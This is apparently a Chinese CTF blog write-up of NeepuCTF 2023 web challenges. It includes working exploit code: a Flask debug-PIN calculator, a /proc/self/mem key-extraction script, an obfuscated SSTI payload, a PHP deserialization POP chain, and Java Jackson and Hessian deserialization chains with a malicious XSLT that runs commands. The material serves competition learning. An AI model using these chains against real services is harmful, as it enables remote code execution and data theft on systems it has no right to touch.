title: NEEPU Sec 2023 公开赛web题复现
author: bmth
tags:
  - NeepuCTF
categories:
  - CTF
top_img: 'https://img-blog.csdnimg.cn/20ca5db2560940f7b07b661b25322b3e.png'
cover: 'https://img-blog.csdnimg.cn/20ca5db2560940f7b07b661b25322b3e.png'
date: 2023-05-25 01:50:00
---
![](https://img-blog.csdnimg.cn/20ca5db2560940f7b07b661b25322b3e.png)

抽空参加了一下东北电力大学的公开赛，题出的挺好的，遂专门写一篇文章，主要是学习一下java题

## Cute Cirno
访问`/r3aDF1le?filename=`可以任意文件读取，发现filename传空时会报错
![](https://img-blog.csdnimg.cn/f7b917b2c35f43c995fe9c55c22b71a0.png)

给出了源码路径，其实也可以读取`/proc/self/cmdline`获取路径
![](https://img-blog.csdnimg.cn/f59fb9aef9dc4558a88c5209c841bcd2.png)

CuteCirno.py：
```python
from flask import Flask, request, session, render_template, render_template_string
import os, base64
from NeepuFile import neepu_files

CuteCirno = Flask(__name__,
                  static_url_path='/static',
                  static_folder='static'
                  )

CuteCirno.config['SECRET_KEY'] = str(base64.b64encode(os.urandom(30)).decode()) + "*NeepuCTF*"

@CuteCirno.route('/')
def welcome():
    session['admin'] = 0
    return render_template('welcome.html')


@CuteCirno.route('/Cirno')
def show():
    return render_template('CleverCirno.html')


@CuteCirno.route('/r3aDF1le')
def file_read():
    filename = "static/text/" + request.args.get('filename', 'comment.txt')
    start = request.args.get('start', "0")
    end = request.args.get('end', "0")
    return neepu_files(filename, start, end)


@CuteCirno.route('/genius')
def calculate():
    if session.get('admin') == 1:
        print(session.get('admin'))
        answer = request.args.get('answer')
        if answer is not None:
            blacklist = ['_', "'", '"', '.', 'system', 'os', 'eval', 'exec', 'popen', 'subprocess',
                         'posix', 'builtins', 'namespace','open', 'read', '\\', 'self', 'mro', 'base',
                         'global', 'init', '/','00', 'chr', 'value', 'get', "url", 'pop', 'import',
                         'include','request', '{{', '}}', '"', 'config','=']
            for i in blacklist:
                if i in answer:
                    answer = "⑨" +"""</br><img src="static/woshibaka.jpg" width="300" height="300" alt="Cirno">"""
                    break
            if answer == '':
                return "你能告诉聪明的⑨, 1+1的answer吗"
            return render_template_string("1+1={}".format(answer))
        else:
            return render_template('mathclass.html')

    else:
        session['admin'] = 0
        return "你真的是我的马斯塔吗？"


if __name__ == '__main__':
    CuteCirno.run('0.0.0.0', 5000, debug=True)
```
可以任意文件读取、flask存在debug、python3.8，直接想到了算pin码
读取`/sys/class/net/eth0/address`
![](https://img-blog.csdnimg.cn/055bd4c7f3af401cbf924321e41d9cd3.png)

转为10进制为2485378154512
machine_id为`/etc/machine-id`+`/proc/self/cgroup`
![](https://img-blog.csdnimg.cn/925ff6f1f6c54e63870c87e7c6019390.png)

最后python3.8生成pin码的脚本如下：
```python
#sha1
import hashlib
from itertools import chain

probably_public_bits = [
    'app'# /etc/passwd
    'flask.app',# 默认值
    'Flask',# 默认值
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到
]

private_bits = [
    '2485378154499',
	'7265fe765262551a676151a24c02b7b66b3ae4a10d09c99200a38b17919de5b5fd6980b35b551205233dcc08987ac315'
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```
最后进入控制台直接rce
![](https://img-blog.csdnimg.cn/f57a7c8ade494a918f8b7d0da317d6c8.png)

可参考：
[关于ctf中flask算pin总结](https://blog.csdn.net/qq_35782055/article/details/129126825)
[flask的pin码攻击——新版本下pin码的生成方式](https://blog.csdn.net/qq_42303523/article/details/124232532)

## Cute Cirno (Revenge)
其实算pin码为非预期，预期解是伪造session然后进行模板注入，但是 SECRET_KEY 为随机数，那么就需要从内存中读取key了

读取脚本如下：
```python
import requests, re

url = "http://neepusec.fun:28359"

maps_url = f"{url}/r3ADF11e?filename=../../../../../../../proc/self/maps"
maps_reg = "([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0"
maps = re.findall(maps_reg, requests.get(maps_url).text)
# print(maps)

for m in maps:
    start, end = m.split("-")[0], m.split("-")[1]
    start, end = str(int(start, 16)), str(int(end, 16))
    read_url = f"{url}/r3ADF11e?filename=../../../../../proc/self/mem&start={start}&end={end}"
    s = requests.get(read_url).content
    rt = re.findall(b"[a-z0-9A-Z-+-/]{40}\*NeepuCTF\*", s)
    if rt:
        print(rt)
```
![](https://img-blog.csdnimg.cn/49778b92e4b94ec6890d8851842f7f20.png)

得到key后，可以使用flask-unsign伪造session
`flask-unsign --sign --cookie "{'admin':1}" --secret "ALB2HGeH1DeYYcRo6Thy5KpzYT8yM2EGbGcCKd4Q*NeepuCTF*"`
![](https://img-blog.csdnimg.cn/65e140c303cb4e8b93f26474f3c599b7.png)

最后访问`/genius`路由打SSTI
![](https://img-blog.csdnimg.cn/1f62ab0bdbce4e7d8a7a75ea713155b8.png)

这里强烈推荐一个工具：[https://github.com/Marven11/Fenjing/](https://github.com/Marven11/Fenjing/)，它会帮我们找到绕过黑名单的payload
发现已经有师傅问过了：[https://github.com/Marven11/Fenjing/issues/4](https://github.com/Marven11/Fenjing/issues/4)

生成payload的脚本如下：
```python
from fenjing import exec_cmd_payload, config_payload
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str):
    blacklist = ['_', "'", '"', '.', 'system', 'os', 'eval', 'exec', 'popen', 'subprocess',
                    'posix', 'builtins', 'namespace','open', 'read', '\\', 'self', 'mro', 'base',
                    'global', 'init', '/','00', 'chr', 'value', 'get', "url", 'pop', 'import',
                    'include','request', '{{', '}}', '"', 'config','=']
    return all(word not in s for word in blacklist)

if __name__ == "__main__":
    shell_payload, _ = exec_cmd_payload(waf, "/readflag")

    print(f"{shell_payload}")
```

脚本生成得到
```
{%print(((((((lipsum[(lipsum|escape|batch(22)|list|first|last)*2+(((((lipsum,)|map(((lipsum|string|list|batch(3)|first|last)~(lipsum|string|list|batch(15)|first|last)~(lipsum|string|list|batch(20)|first|last)~(x|pprint|list|batch(4)|first|last)~(x|pprint|list|batch(2)|first|last)~(lipsum|string|list|batch(5)|first|last)~(lipsum|string|list|batch(8)|first|last)~(x|pprint|list|batch(3)|first|last)~(x|pprint|list|batch(4)|first|last)))|list|first|first)+(lipsum|escape|batch(8)|first|last))*7)%(103,108,111,98,97,108,115))+(lipsum|escape|batch(22)|list|first|last)*2])[(((((lipsum,)|map(((lipsum|string|list|batch(3)|first|last)~(lipsum|string|list|batch(15)|first|last)~(lipsum|string|list|batch(20)|first|last)~(x|pprint|list|batch(4)|first|last)~(x|pprint|list|batch(2)|first|last)~(lipsum|string|list|batch(5)|first|last)~(lipsum|string|list|batch(8)|first|last)~(x|pprint|list|batch(3)|first|last)~(x|pprint|list|batch(4)|first|last)))|list|first|first)+(lipsum|escape|batch(8)|first|last))*12)%(95,95,98,117,105,108,116,105,110,115,95,95))])[(((((lipsum,)|map(((lipsum|string|list|batch(3)|first|last)~(lipsum|string|list|batch(15)|first|last)~(lipsum|string|list|batch(20)|first|last)~(x|pprint|list|batch(4)|first|last)~(x|pprint|list|batch(2)|first|last)~(lipsum|string|list|batch(5)|first|last)~(lipsum|string|list|batch(8)|first|last)~(x|pprint|list|batch(3)|first|last)~(x|pprint|list|batch(4)|first|last)))|list|first|first)+(lipsum|escape|batch(8)|first|last))*4)%(101,118,97,108))])((((((lipsum,)|map(((lipsum|string|list|batch(3)|first|last)~(lipsum|string|list|batch(15)|first|last)~(lipsum|string|list|batch(20)|first|last)~(x|pprint|list|batch(4)|first|last)~(x|pprint|list|batch(2)|first|last)~(lipsum|string|list|batch(5)|first|last)~(lipsum|string|list|batch(8)|first|last)~(x|pprint|list|batch(3)|first|last)~(x|pprint|list|batch(4)|first|last)))|list|first|first)+(lipsum|escape|batch(8)|first|last))*35)%(95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,112,111,112,101,110,40,39,47,114,101,97,0x64,102,108,97,103,39,41))))[(((((lipsum,)|map(((lipsum|string|list|batch(3)|first|last)~(lipsum|string|list|batch(15)|first|last)~(lipsum|string|list|batch(20)|first|last)~(x|pprint|list|batch(4)|first|last)~(x|pprint|list|batch(2)|first|last)~(lipsum|string|list|batch(5)|first|last)~(lipsum|string|list|batch(8)|first|last)~(x|pprint|list|batch(3)|first|last)~(x|pprint|list|batch(4)|first|last)))|list|first|first)+(lipsum|escape|batch(8)|first|last))*4)%(114,101,97,0x64))])()))%}
```
url编码传入即可得到flag
![](https://img-blog.csdnimg.cn/259f045b6e6e44f6b68c667f8595a2a7.png)


参考：
[【官方WP】第六届“蓝帽杯”初赛CTF题目解析](https://mp.weixin.qq.com/s/A9OmgHAmGLJPEL4cQBU8zQ)
[攻防世界 x Nepnep x CATCTF 2022 Nepnep战队官方WP](https://www.wolai.com/nepnep/4njXHjpSLx3uPHR2fc6XL7)


## ezphp
访问发现php版本为PHP/7.4.21，然而近期出过一个源码泄露的漏洞：[PHP<=7.4.21 Development Server源码泄露漏洞](https://www.gem-love.com/2023/02/04/PHP-7-4-21-Development-Server%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/)

尝试一下，Burp关闭Update Content-Length的功能，成功得到源码
![](https://img-blog.csdnimg.cn/b997270fa5864351a4d0579f0d190f73.png)

index.php：
```php
<?php
class  one{
    public function __call($name,$ary)
    {
        if ($this->key === true||$this->finish1->name) {
            if ($this->finish->finish){
                call_user_func($this->now[$name],$ary[0]);
            }
        }
    }
    public function neepuctf(){
        $this->now=0;
        return $this->finish->finish;
    }
    public function __wakeup(){
        $this->key=True;
    }
}
class two{
    private $finish;
    public $name;
    public function __get($value){

        return $this->$value=$this->name[$value];
    }

}

class three{
    public function __destruct()
    {
        if($this->neepu->neepuctf()||!$this->neepu1->neepuctf()){
            $this->fin->NEEPUCTF($this->rce,$this->rce1);
        }

    }
}
class four{
    public function __destruct()
    {
        if ($this->neepu->neepuctf()){
            $this->fin->NEEPUCTF1($this->rce,$this->rce1);
        }

    }
    public function __wakeup(){
        $this->key=false;
    }
}
class five{
    public $finish;
    private $name;

    public function __get($name)
    {
        return $this->$name=$this->finish[$name];
    }
}

$a=$_POST["neepu"];
if (isset($a)){
    unserialize($a);
}
```
就是一个简单的php反序列化，主要是通过`four.__destruct()->one.__call()`，然后要满足`$this->neepu->neepuctf()`为true

exp如下：
```php
$a = new four();
$a->rce = "cat /flag";
$a->neepu = new one();
$a->neepu->finish = new two();
$a->neepu->finish->name=array("finish"=>1);

$a->fin = new one();
$a->fin->now = array("NEEPUCTF1"=>"system");
$a->fin->finish = new two();
$a->fin->finish->name=array("finish"=>1);

$b = serialize($a);
echo(urlencode($b));
```
POST传入
![](https://img-blog.csdnimg.cn/cb9a4018d5d34717b766a6eff2d3ef99.png)

成功得到flag
## No Map
直接反编译看一下依赖，存在jackson依赖
![](https://img-blog.csdnimg.cn/048b93f6368540df8e184373d93beeaf.png)

发现是原生的Springboot的反序列化，但是ban掉了HashMap和BadAttributeValueExpException两个toString的链
![](https://img-blog.csdnimg.cn/7278671ac07c4a0aa0dd294229a832f5.png)

我们直接tabby找一下readObject到toString的链，我这里通过排查，最后的查询语句如下：
```
match (source:Method) where source.NAME in ["readObject"]
match (sink:Method {NAME:"toString"})<-[r:CALL]-(m1:Method) where r.REAL_CALL_TYPE in ["java.lang.Object"]
call apoc.algo.allSimplePaths(m1, source, "<CALL|ALIAS", 6) yield path where none(n in nodes(path) where (n.CLASSNAME =~ "javax.management.*" or n.CLASSNAME =~ "com.alibaba.fastjson.*" or n.CLASSNAME =~"java.uti.*" or n.CLASSNAME =~"com.sun.jndi.*" or n.CLASSNAME =~"sun.rmi.*" or n.CLASSNAME=~"java.net.URL.*" or n.CLASSNAME=~"java.io.*" or n.CLASSNAME=~"java.math.BigDecimal" or n.CLASSNAME=~"com.sun.javafx.*" or n.CLASSNAME=~"java.awt.*" or n.CLASSNAME=~"javax.swing.tree.DefaultTreeCellEditor" or n.CLASSNAME=~"com.sun.deploy.cache.*" or n.CLASSNAME=~"javax.security.auth.kerberos.KerberosPrincipal" or n.CLASSNAME=~"javax.crypto.SealedObject" or n.CLASSNAME=~"javax.sql.rowset.serial.SerialArray" or n.CLASSNAME=~"org.yaml.snakeyaml.events.Event" or n.CLASSNAME=~"sun.jvm.hotspot.utilities.ObjectReader" or n.CLASSNAME=~"javax.swing.ArrayTable" or n.NAME=~"clone" or n.CLASSNAME=~"javax.swing.text.DefaultStyledDocument" or n.CLASSNAME=~"javax.swing.tree.DefaultTreeSelectionModel" or n.CLASSNAME=~"java.beans.beancontext.BeanContextSupport" or n.CLASSNAME=~"sun.security.pkcs.PKCS8Key" or n.CLASSNAME=~"sun.font.FontDesignMetrics"))
return * limit 10
```
就可以得到Boogipop师傅找到的AbstractAction类了
![](https://img-blog.csdnimg.cn/5d4a3f56172b46ec87706df8cdc8d8b7.png)

简单看一下`javax.swing.AbstractAction`这个类，它是一个抽象类，ctrl+alt+b 可找到它的子类
![](https://img-blog.csdnimg.cn/be14e4c0988548b59fd6d89ab01c2168.png)

readObject会触发putValue方法，跟进
![](https://img-blog.csdnimg.cn/0378a7e710b64d5196e067b0ce59753d.png)

发现会调用firePropertyChange方法，继续跟进
![](https://img-blog.csdnimg.cn/4ed7ed570fac4daf85c6393bb6137931.png)

调用了oldValue的equals方法，并且参数为newValue，都是Object类，那么就可以用它触发Xstring的equals方法了

这里有一个问题就是 oldValue 为 `arrayTable.get(key)`，但是我们序列化的时候会执行 writeObject 方法，他会执行`ArrayTable.writeArrayTable(s, arrayTable);`导致我们写不进两个key相同value不同的ArrayTable
![](https://img-blog.csdnimg.cn/cb5480416ada4bc0b62b2a1e703d1eae.png)

可以通过Agent来重写这个writeObject方法，让它实现 ArrayTable 的 writeArrayTable 效果的同时将我们想写的东西写入
网上已经有师傅总结了这种方法：[对writeObject流程动点手脚 ](https://xz.aliyun.com/t/11720)
```java
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

public class AbstractAction_DefineTransformer implements ClassFileTransformer {
    public static final String ClassName = "javax.swing.AbstractAction";

    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
        className = className.replace("/", ".");
        if (className.equals("javax.swing.AbstractAction")) {
            System.out.println("Find the Inject Class: javax.swing.AbstractAction");
            ClassPool pool = ClassPool.getDefault();
            try {
                CtClass c = pool.getCtClass(className);
                CtMethod ctMethod = c.getDeclaredMethod("writeObject");
                ctMethod.setBody("{" +
                        "$1.defaultWriteObject();" +
                        "java.lang.Object keys[] = arrayTable.getKeys(null);" +
                        "int validCount = keys.length;" +
                        "$1.writeInt(validCount);" +
                        " for (int i=0; i<validCount; i++) {\n" +
                        " if (keys != null) {\n" +
                        " $1.writeObject(\"test\");\n" +
                        " $1.writeObject(arrayTable.get(keys[i]));\n" +
                        " }\n" +
                        " }\n" +
                        "}");
                byte[] bytes = c.toBytecode();
                c.detach();
                return bytes;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return new byte[0];
    }
}
```
最后就是jackson反序列化触发任意getter了
注意运行前要添加VM选项`-javaagent:AbstractActionAgent.jar`
```java
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;

import javassist.*;
import sun.reflect.ReflectionFactory;

import javax.swing.event.SwingPropertyChangeSupport;
import javax.swing.text.DefaultEditorKit;
import java.io.*;
import java.lang.reflect.*;

public class jackson_AbstractAction{
    static {
        try {
            // javassist 修改 BaseJsonNode
            ClassPool classPool = ClassPool.getDefault();
            CtClass ctClass = classPool.getCtClass("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            writeReplace.setBody("return $0;");
            ctClass.writeFile();
            ctClass.toClass();
        } catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void main( String[] args ) throws Exception {
        byte[] bytes = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();

        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "a");
        setFieldValue(templatesImpl, "_tfactory", null);

        POJONode jsonNodes = new POJONode(templatesImpl);
        XString xString = new XString("a");

        DefaultEditorKit.BeepAction action = new DefaultEditorKit.BeepAction();
        SwingPropertyChangeSupport swingPropertyChangeSupport = new SwingPropertyChangeSupport("");

        Object arraytable = createWithoutConstructor("javax.swing.ArrayTable");
        setFieldValue(arraytable,"table",new Object[]{"1",xString,"2",jsonNodes});
        setFieldValue(action,"arrayTable",arraytable);
        setFieldValue(action,"changeSupport",swingPropertyChangeSupport);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(action);
        oos.close();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
    public static <T> T createWithConstructor ( Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs ) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }
    public static Object createWithoutConstructor(String classname) throws ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        return createWithoutConstructor(Class.forName(classname));
    }

    public static <T> T createWithoutConstructor ( Class<T> classToInstantiate )
            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }
}
```
![](https://img-blog.csdnimg.cn/c23d57edb1474496865ebd53bee571a3.png)

当然这题ban掉了TemplatesImpl，最后就是 java.security.SignedObject 触发二次反序列化即可

参考：
[NeepuCTF2023 公开赛 Writeup](https://boogipop.com/2023/05/21/NeepuCTF2023%20%E5%85%AC%E5%BC%80%E8%B5%9B%20Writeup/)
[https://github.com/R1ckyZ/My-CTF-Challenges/tree/main/NEEPUCTF%202023/No%20Map/solve](https://github.com/R1ckyZ/My-CTF-Challenges/tree/main/NEEPUCTF%202023/No%20Map/solve)


## 是不是有Bean
反编译看到pom.xml，发现就一个hessian依赖
![](https://img-blog.csdnimg.cn/3e48aac4405143adb6a17c31a32a7ea6.png)

这个hessian版本是存在CVE-2021-43297，然后就是D3CTF的fastjson链换成了jackson链

来看一下之前0CTF给出的wp：[https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk/writeup](https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk/writeup)
![](https://img-blog.csdnimg.cn/bd93cba2440543c987874ea13020c74d.png)

用tabby找一下返回类型为void的类
```
match (m1:Method) where m1.CLASSNAME=~"com.sun.org.*" and m1.RETURN_TYPE="void" and m1.IS_STATIC=true and m1.IS_PUBLIC=true
return m1 limit 20
```
![](https://img-blog.csdnimg.cn/68313714d622444db903a14a5a4429df.png)

就可以找到wp给出的：`com.sun.org.apache.xalan.internal.xslt.Process._main`方法
网上已经有了Xalan的利用方法：[Xalan-J XSLT 整数截断漏洞利用构造(CVE-2022-34169)](https://paper.seebug.org/1963/)

exp：
```java
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;

import com.caucho.hessian.io.SerializerFactory;
import sun.reflect.ReflectionFactory;
import sun.security.pkcs.PKCS9Attribute;
import sun.security.pkcs.PKCS9Attributes;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;

public class Hessian_PKCS9Attributes_SwingLazyValue_Process {
    public static void main(String[] args) throws Exception {
        PKCS9Attributes s = createWithoutConstructor(PKCS9Attributes.class);
        UIDefaults uiDefaults = new UIDefaults();
        String payload = "http://127.0.0.1:8000/calc.xml";
        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("com.sun.org.apache.xalan.internal.xslt.Process", "_main", new Object[]{new String[]{"-XSLTC", "-XSL", payload}}));

        setFieldValue(s,"attributes",uiDefaults);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(baos);
        out.setSerializerFactory(new SerializerFactory());
        out.getSerializerFactory().setAllowNonSerializable(true);
        baos.write(79);
        out.writeObject(s);
        out.flush();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        Hessian2Input input = new Hessian2Input(bais);
        input.readObject();
    }

    public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }

    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```
calc.xml：
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
    <xsl:template match="/">
      <xsl:variable name="rtobject" select="rt:getRuntime()"/>
      <xsl:variable name="process" select="rt:exec($rtobject,'calc')"/>
      <xsl:variable name="processString" select="ob:toString($process)"/>
      <xsl:value-of select="$processString"/>
    </xsl:template>
</xsl:stylesheet>
```
![](https://img-blog.csdnimg.cn/b04bdc1692474d72a53ac77ff47e471a.png)

成功rce
